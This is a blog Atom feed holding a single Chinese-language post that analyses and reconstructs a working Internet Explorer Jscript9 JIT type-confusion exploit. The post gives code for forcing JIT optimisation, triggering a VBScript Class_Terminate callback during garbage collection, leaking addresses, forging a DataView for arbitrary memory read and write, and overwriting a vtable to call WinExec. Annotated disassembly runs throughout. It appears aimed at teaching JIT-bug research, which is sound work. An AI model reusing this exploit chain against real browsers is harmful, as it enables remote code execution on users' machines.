<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>theme</title>
  
  
  <link href="https://theme-me.github.io/atom.xml" rel="self"/>
  
  <link href="https://theme-me.github.io/"/>
  <updated>2021-04-18T01:21:11.334Z</updated>
  <id>https://theme-me.github.io/</id>
  
  <author>
    <name>theme</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Jscript9 GC JIT Calc</title>
    <link href="https://theme-me.github.io/Jscript9%20GC%20JIT%20Calc/"/>
    <id>https://theme-me.github.io/Jscript9%20GC%20JIT%20Calc/</id>
    <published>2020-04-18T09:03:26.000Z</published>
    <updated>2021-04-18T01:21:11.334Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x0-概述"><a href="#0x0-概述" class="headerlink" title="0x0 概述"></a>0x0 概述</h2><p>漏洞样本来自<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2d1aGUxMjAvYnJvd3Nlci9ibG9iL21hc3Rlci9HQy9qaXRfY2FsYy5odG1s">yuki chen的github<i class="fa fa-external-link-alt"></i></span></p><p>漏洞成因：由于JavaScript中的垃圾回收流程内，可以通过VBScript Class_Terminator触发回调，而JIT引擎未考虑到这一点。因此在JIT代码中可以通过这种方式触发回调。</p><p>并且由于Jscript9对下方代码时进行JIT优化时，会触发冗余消除机制: </p><pre><code>...arr[1,2,3]b = arr[0]...c = arr[1]...</code></pre><p>优化后的代码访问arr[0]和arr[1]两个成员时，由于冗余消除机制，只会检查arr对象的类型一次，借此就能通过在jit代码中触发垃圾回收进而触发回调，在回调中修改arr对象成员的类型实现类型混淆，进而获得完整exploit。</p><blockquote><p>saelo在<span class="exturl" data-url="aHR0cDovL3BocmFjay5vcmcvcGFwZXJzL2ppdF9leHBsb2l0YXRpb24uaHRtbA==">The Art of Exploitation<i class="fa fa-external-link-alt"></i></span>中提到了该机制。</p></blockquote><h2 id="0x1-漏洞分析"><a href="#0x1-漏洞分析" class="headerlink" title="0x1 漏洞分析"></a>0x1 漏洞分析</h2><h3 id="1-force-to-optimize"><a href="#1-force-to-optimize" class="headerlink" title="1.force to optimize"></a><strong>1.force to optimize</strong></h3><p>下方代码的功能为强制触发JIT优化:</p><pre><code>var a = [1, 2, 3];stop = true;for (var i = 0; i &lt; 10000; ++i)    func(a, [&#123;&#125;, &#123;&#125;]);</code></pre><p>循环过程中触发JIT优化，优化完成后解释执行函数入口被修改为JIT函数入口，为后续利用做准备。</p><h3 id="2-using-VBScript-Class-Terminator-to-trigger-Callback-in-JavaScript-GC"><a href="#2-using-VBScript-Class-Terminator-to-trigger-Callback-in-JavaScript-GC" class="headerlink" title="2.using VBScript Class_Terminator to trigger Callback in JavaScript GC"></a><strong>2.using VBScript Class_Terminator to trigger Callback in JavaScript GC</strong></h3><p>下方代码在vbscript中创建了类cla0，并且在其Class_Terminate回调中调用了JavaScript中的函数：</p><pre><code>&lt;script type=&quot;text/vbscript&quot;&gt;Dim oClass cla0Private Sub Class_Terminate    call ffEnd SubEnd ClassSet o = new cla0&lt;/script&gt;</code></pre><p>此处代码作用为：在JavaScript中引用vbscript对象，再消除其引用，使用setTimeout调用函数触发垃圾回收时，最终会执行JavaScript中的ff函数，在其中就可以利用概述中提到的特性进行类型混淆。</p><blockquote><p>使用setTimeout调用函数是为了离开当前作用域以消除当前作用域对vbscript对象的引用，因此此处代码和强制触发JIT优化处为一个作用域，main函数在另一个。</p></blockquote><pre><code>arr.push(o);o = null;arr[0] = null;setTimeout(main, 1);</code></pre><h3 id="3-Type-Confusion"><a href="#3-Type-Confusion" class="headerlink" title="3.Type Confusion"></a><strong>3.Type Confusion</strong></h3><p>下面是main函数中调用func函数部分代码，与func函数实现:</p><pre><code>var u32 = new Uint32Array(10);var ga = new Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);var fo = new Array(&#123;&#125;, &#123;&#125;, &#123;&#125;);function func(arr, a2) &#123;    arr[0] = 1;    var bb = &#123; p0: 1, p1: 1, p2: 1, p3: 1,...,p2866: 1 &#125;;//省略了中间的代码    if (!stop)        return;    a2[1] = ga;    a2[2] = fo;    arr[0] = arr[1] + 0x38;    u32[0] = arr[1];    u32[1] = arr[2];    arr[1] = 1;&#125;function main() &#123;    ...    ggg = a;    for (; i &lt; 0x100000 &amp;&amp; !stop; ++i) &#123;        func(a, a);    &#125;    ...&#125;</code></pre><p>在强制触发JIT优化时，和main()函数中对func函数的调用区别在于第二参数，之前是[{}, {}]，此次为[1, 2, 3]。</p><p>由于第一次调用时func函数的第二参数为Object数组，JIT生成的汇编代码会直接以Object方式去访问a2的成员。</p><p>不断调用func()函数创建bb对象，在内存耗尽后为bb对象申请内存时，会触发GC以回收未使用的内存。</p><p>GC过程中清理了vbscript对象o，继而执行Class_Terminate调用JavaScript函数ff，其代码如下:</p><pre><code>function ff() &#123;    ggg[0] = &#123;&#125;;    stop = true;&#125;</code></pre><p>可以看到在其中将a[0]更改为了object类型，并设置stop为true，这样在此次bb对象申请内存完毕后，就可以绕过检查实现类型混淆。</p><h4 id="func函数JIT后的关键代码："><a href="#func函数JIT后的关键代码：" class="headerlink" title="func函数JIT后的关键代码："></a>func函数JIT后的关键代码：</h4><p>首先访问arr[0]，赋值前检查对象类型，此处检查过后，后续就不会再检查其类型是否正确</p><pre><code>1c0d0000    push    ebp1c0d0001    mov     ebp, esp...1c0d005c    mov     esi, dword ptr [ebp+14h]1c0d005f    mov     eax, 01c0d0064    test    esi, 11c0d006a    jne     1c0d945a1c0d0070    cmovne  esi, esi1c0d0073    mov     eax, 01c0d0078    cmp     dword ptr [esi], offset jscript9!Js::JavascriptNativeIntArray::`vftable&#39; (71362358)</code></pre><p>接着为bb对象申请所需内存，内存耗尽后触发GC，继而执行ff函数修改了对象a的类型，设置stop为true</p><pre><code>...1c0d00be    call    jscript9!Js::JavascriptOperators::NewScObjectMemContext (71432530)初始化bb对象...</code></pre><p>由于stop被修改，此处代码继续向下执行</p><pre><code>1c0d9220    cmp     eax, 11c0d9223    jmp     1c0d92391c0d9228    cmp     dword ptr [eax], offset jscript9!Js::JavascriptBoolean::`vftable&#39; (71375c54)            ; if (!stop) return;1c0d922e    jne     1c0d95511c0d9234    cmp     eax, 11E3B670h1c0d9239    jne     1c0d92491c0d923f    mov     edi, 11E3BFE0h1c0d9244    jmp     1c0d943a</code></pre><p>访问a2[1]: 由于在main函数中，调用func函数时两个参数都是a对象，而在GC中调用ff函数后，a[0]（ggg[0]）已经从<strong>JavascriptNativeIntArray</strong>被修改为了<strong>JavascriptArray</strong>，此时就实现了对arr对象的类型混淆。</p><pre><code>...1c0d9255    mov     ecx, 01c0d925a    test    bl, 11c0d925d    jne     1c0d95631c0d9263    cmovne  ebx, ebx1c0d9266    mov     ecx, 01c0d926b    cmp     dword ptr [ebx], offset jscript9!Js::JavascriptArray::`vftable&#39; (713638c0)</code></pre><p>a2[1] = ga: 此处直接将ga对象地址放入了<strong>JavascriptArray</strong>的buffer中，fo对象地址也以同样的方式被放入a2[2]。</p><pre><code>...1c0d9249    mov     eax, dword ptr ds:[11E36208h]   ;eax: ga address1c0d924f    mov     eax, dword ptr [eax+5B4h]...1c0d9284    mov     ecx, dword ptr [ebx+14h]        ;ebx: a2 address 1c0d9287    cmp     dword ptr [ecx+4], 11c0d928b    jbe     1c0d958b1c0d9291    mov     edx, 11c0d9296    sub     edx, dword ptr [ecx+4]1c0d9299    sar     edx, 1Fh1c0d929c    lea     ecx, [ecx+14h]1c0d929f    and     ecx, edx1c0d92a1    mov     dword ptr [ecx], eax...</code></pre><p>arr[0] = arr[1] + 0x38: 由于类型混淆，arr以int值取出了ga对象地址，并从中取出了ga对象的buffer地址(类型为<strong>JavascriptNativeIntArray</strong>，array buffer位于+38h处)。</p><pre><code>...1c0d92db    mov     ecx, 11c0d92e0    sub     ecx, dword ptr [eax+4]1c0d92e3    sar     ecx, 1Fh1c0d92e6    mov     ebx, dword ptr [eax+14h]1c0d92e9    and     ebx, ecx1c0d92eb    mov     eax, ebx1c0d92ed    add     eax, 38h1c0d92f0    jo      1c0d96e31c0d92f6    mov     ecx, dword ptr [esi+14h]        ;esi: arr address1c0d92f9    cmp     dword ptr [ecx+4], 01c0d92fd    jbe     1c0d96f21c0d9303    xor     edx, edx1c0d9305    sub     edx, dword ptr [ecx+4]1c0d9308    sar     edx, 1Fh1c0d930b    lea     ecx, [ecx+10h]1c0d930e    and     ecx, edx1c0d9310    mov     dword ptr [ecx], eax            ;arr[0] = ga address + 0x38...</code></pre><p>最后将获得的地址放入u32中后返回，其类型为**TypedArray&lt;unsigned int,0&gt;**，方便后续使用。</p><h2 id="0x2-利用分析"><a href="#0x2-利用分析" class="headerlink" title="0x2 利用分析"></a>0x2 利用分析</h2><p>通过类型混淆获得了对象地址后，接下来就是一般的利用流程了。</p><p>在泄露了地址的ga对象buffer中伪造一个DataView对象：</p><pre><code>ga_addr = u32[0];fo_addr = u32[1];dv_addr = ga_addr + 0x38;ga[0] = 0x2e;ga[1] = dv_addr;ga[2] = dv_addr - 0x210;ga[3] = 0;ga[4] = ga_addr + 0x24;ga[5] = 0;ga[6] = -1;ga[7] = dv_addr;</code></pre><p>这里通过封装DataView.prototype.getUint32.call实现了读取任意地址。当前伪造的DataView是没有虚表的，这里通过调用prototype的虚函数（即Js::DataView::EntryGetUint32，上方伪造的DataView成员值是为了绕过该函数中的检查）来绕过对伪造的DataView虚表的访问</p><pre><code>function read32(addr) &#123;    if (addr &gt;= 0x80000000) &#123;        addr = -(0x100000000 - addr);    &#125;    ga[0x1c / 4] = addr;    return DataView.prototype.getUint32.call(dv, 0, true);&#125;</code></pre><p>从正确的DataView对象中取出Type字段，填充进伪造的DataView对象内。</p><blockquote><p>不修改该字段获取target_arr地址过程中会报错</p></blockquote><pre><code>dv = a[0];var rdv = new DataView(new ArrayBuffer(8));var rtype = readPointer(leakObjectAddress(rdv) + 4);// Fix fake DataView-&gt;typega[0x04 / 4] = rtype;var space = new DataView(new ArrayBuffer(0x200));var space_addr = readPointer(leakObjectAddress(space) + 0x1c);var fake_vtable_addr = space_addr;var cmd_addr = space_addr + 0x100;</code></pre><p>再次泄露一个<strong>JavascriptNativeIntArray</strong>对象地址从其虚表获得jscript9基地址，继而获得Winexec地址。</p><pre><code>var target_arr = new Array(1, 2, 3, 4, 5);var target_arr_addr = leakObjectAddress(target_arr);jscript9_base = getModuleBase(readPointer(target_arr_addr));kernel32_base = getModuleBaseFromIAT(jscript9_base, &#39;KERNEL32&#39;);var winexec = getProcAddress(kernel32_base, &#39;WinExec&#39;);</code></pre><p>最后修改了target_arr_addr对象的虚表地址，将Winexec函数指针放在伪造虚表的+0x7c处，调用对应虚函数（<strong>Js::JavascriptNativeIntArray::HasItem</strong>）后弹出计算器。</p><pre><code>write32(target_arr_addr, fake_vtable_addr);write32(fake_vtable_addr + 0x7C, winexec);writeString(cmd_addr, &#39;calc&#39;);if (cmd_addr in target_arr) &#123; &#125;</code></pre><h2 id="0x3-总结"><a href="#0x3-总结" class="headerlink" title="0x3 总结"></a>0x3 总结</h2><p>该漏洞是一个逻辑漏洞，因此利用十分稳定，个人觉得可以通过该漏洞入门JIT优化错误类漏洞。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x0-概述&quot;&gt;&lt;a href=&quot;#0x0-概述&quot; class=&quot;headerlink&quot; title=&quot;0x0 概述&quot;&gt;&lt;/a&gt;0x0 概述&lt;/h2&gt;&lt;p&gt;漏洞样本来自&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly9naXRod</summary>
      
    
    
    
    
  </entry>
  
</feed>
